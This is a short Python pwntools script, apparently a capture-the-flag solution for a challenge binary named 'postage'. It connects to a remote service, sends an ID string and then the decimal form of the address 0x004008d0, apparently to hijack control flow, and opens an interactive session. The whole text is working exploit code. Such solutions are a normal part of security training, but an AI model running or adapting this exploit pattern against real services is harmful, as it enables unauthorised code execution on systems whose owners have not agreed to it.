from pwn import *

# context.log_level='debug'

# p = process('./postage')
p = remote('url', port)
p.sendafter('abc123): ', 'tg1799\n')
p.sendafter('postage?\n', str(0x004008d0)+'\n')

p.interactive()
